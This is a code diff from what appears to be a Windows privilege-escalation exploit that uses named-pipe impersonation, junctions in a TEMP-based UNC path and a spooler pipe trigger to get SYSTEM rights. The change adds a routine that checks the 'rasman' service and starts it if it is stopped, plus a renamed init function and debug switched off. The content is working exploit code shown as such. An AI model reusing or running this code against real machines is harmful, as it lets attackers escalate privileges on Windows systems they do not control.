@@ -8,7 +8,7 @@
 #pragma warning(disable:4996)
 #pragma warning( disable : 28251 )
 
-#define DEBUG TRUE
+#define DEBUG FALSE
 
 
 VOID PrintUsage();
@@ -20,7 +20,6 @@ HANDLE ConnectSpoolNamedPipe(HANDLE hPipe);
 HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName);
 DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam);
 BOOL GetSystem(HANDLE hPipe);
-VOID cb();
 BOOL Finish();
 
 LPSTR temp_dir = getenv("TEMP");
@@ -140,7 +139,54 @@ BOOL DeleteJunction(HANDLE handle) {
     }
 }
 
-void load() {
+BOOL CheckRasman() {
+
+    SC_HANDLE scm, svc;
+    SERVICE_STATUS_PROCESS service_status;
+    BOOL status;
+    DWORD bytes;
+    scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+    if (scm == NULL) {
+        printf("[!] Cannot open service manager\n");
+        return FALSE;
+    }
+    svc = OpenService(scm, L"rasman", SERVICE_START | SERVICE_QUERY_STATUS);
+    if (svc == NULL)
+    {
+        printf("[!] Cannot open service\n");
+        CloseServiceHandle(scm);
+        return FALSE;
+    }
+    status = QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&service_status, sizeof(SERVICE_STATUS_PROCESS), &bytes);
+    if (status == 0)
+    {
+        printf("[!] Cannot query service\n");
+        CloseServiceHandle(scm);
+        CloseServiceHandle(svc);
+        return FALSE;
+    }
+    if (service_status.dwCurrentState != SERVICE_RUNNING) {
+        printf("[!] Rasman service is not running!\n[*] Trying to start it..\n");
+        if (!StartService(svc, 0, NULL)) {
+            printf("[!] Cannot start service!\n");
+            CloseServiceHandle(scm);
+            CloseServiceHandle(svc);
+            return FALSE;
+        }
+        printf("[+] Service started!\n");
+        Sleep(2000);
+        CloseServiceHandle(scm);
+        CloseServiceHandle(svc);
+        return TRUE;
+
+    }
+    printf("[+] Rasman service is running!\n");
+    CloseServiceHandle(scm);
+    CloseServiceHandle(svc);
+    return TRUE;
+}
+
+void init() {
     HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
     if (ntdll != NULL) {
         pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
@@ -161,5 +207,12 @@ void load() {
     temp.replace(temp.find(":"), 1, "$").c_str();
     strcat((char*)unc_temp_dir, temp.c_str());
     strcat((char*)unc_temp_dir, "\\Crispr");
+
+
+    // Check Service Start or Stop
+    if (!CheckRasman()) {
+        printf("[+] Rasman service is error\n");
+        exit(-1);
+    }
 
 }
